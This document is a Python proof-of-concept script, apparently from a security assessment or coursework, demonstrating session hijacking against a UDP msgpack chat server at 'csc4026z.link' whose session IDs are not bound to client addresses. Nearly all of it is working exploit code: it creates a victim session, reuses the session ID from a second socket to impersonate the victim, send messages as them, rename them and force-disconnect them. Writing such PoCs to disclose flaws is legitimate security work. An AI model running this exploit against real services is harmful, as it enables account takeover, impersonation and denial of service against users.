"""
PoC — VULN-05: Session Hijacking via Unbound Session IDs

The server assigns a numeric session ID (u32) on CONNECT but never binds it
to the client's source IP:port. Any socket that presents a valid session ID
is treated as the legitimate session owner.

On the cleartext channel (port 51825), all traffic including session IDs
travels in plaintext UDP. A passive observer on the same LAN can sniff any
packet, extract the session ID, and take full control of the victim session.

Demonstrated impact:
  1. Impersonate victim (WHOAMI returns victim's username)
  2. Send channel messages as victim
  3. Rename victim to arbitrary username
  4. Force-disconnect victim (session is permanently terminated)
"""
import socket, msgpack, random, time
HOST, PORT = 'csc4026z.link', 51825

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5.0)
    s.connect((HOST, PORT))
    s.send(msgpack.packb({'request_type': 1, 'request_handle': random.randrange(1, 2**32)}))
    r = msgpack.unpackb(s.recv(4096), raw=True)
    return s, r[b'session']

def req(s, msg):
    s.send(msgpack.packb(msg))
    try:
        return msgpack.unpackb(s.recv(4096), raw=True)
    except socket.timeout:
        return None

def h():
    return random.randrange(1, 2**32)

print('=== PoC: VULN-05 Session Hijacking ===\n')

# --- VICTIM ---
sock_victim, sess_victim = connect()
req(sock_victim, {'request_type': 13, 'session': sess_victim,
                  'request_handle': h(), 'username': 'clear-victim99'})
channel = f'poc-hijack-{random.randint(1000, 9999)}'
req(sock_victim, {'request_type': 4, 'session': sess_victim, 'request_handle': h(),
                  'channel': channel, 'description': 'poc test channel'})

print(f'[Victim]   Connected with session: {sess_victim}')
print(f'[Victim]   Username:               clear-victim99')
print(f'[Victim]   Joined channel:         {channel}')

# Simulated sniff: attacker reads session ID from a victim packet
# (in practice: tcpdump/Wireshark on cleartext UDP — the session ID is in every packet)
sniffed_session = sess_victim
print(f'\n[Network]  Attacker sniffs session ID from cleartext UDP: {sniffed_session}\n')

# --- ATTACKER (completely separate socket, different ephemeral port) ---
sock_attacker = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock_attacker.settimeout(5.0)
sock_attacker.connect((HOST, PORT))

# Step 1: Impersonate
r = req(sock_attacker, {'request_type': 11, 'session': sniffed_session, 'request_handle': h()})
whoami_name = r.get(b'username', b'').decode() if r else None
print(f'[Attacker] WHOAMI with sniffed session → username: {whoami_name!r}')
assert whoami_name == 'clear-victim99', 'WHOAMI failed'

# Step 2: Send message as victim
req(sock_attacker, {'request_type': 9, 'session': sniffed_session, 'request_handle': h(),
                    'channel': channel, 'message': 'hijacked message from attacker'})
time.sleep(0.5)
sock_victim.settimeout(2.0)
msgs = []
for _ in range(5):
    try:
        msgs.append(msgpack.unpackb(sock_victim.recv(4096), raw=True))
    except socket.timeout:
        break
delivered = [m for m in msgs if m.get(b'message')]
print(f'[Attacker] Sent channel message as victim → delivered: {bool(delivered)}')
if delivered:
    print(f'           Content:    {delivered[0].get(b"message", b"").decode()!r}')

# Step 3: Rename victim
r = req(sock_attacker, {'request_type': 13, 'session': sniffed_session, 'request_handle': h(),
                         'username': 'clear-HIJACKED'})
renamed = r.get(b'response_type') == 34 if r else False
print(f'[Attacker] Renamed victim → success: {renamed}')

# Step 4: Kill session
r = req(sock_attacker, {'request_type': 2, 'session': sniffed_session, 'request_handle': h()})
disconnected = r.get(b'response_type') == 23 if r else False
print(f'[Attacker] Force-disconnected victim → success: {disconnected}')

# Verify victim session is dead
time.sleep(0.3)
sock_victim.settimeout(2.0)
r = req(sock_victim, {'request_type': 3, 'session': sniffed_session, 'request_handle': h()})
alive = r and r.get(b'response_type') == 24
print(f'[Victim]   Session still alive after attacker DISCONNECT: {alive}')

print('\n=== CONFIRMED: Full account takeover on cleartext channel ===')

sock_victim.close()
sock_attacker.close()
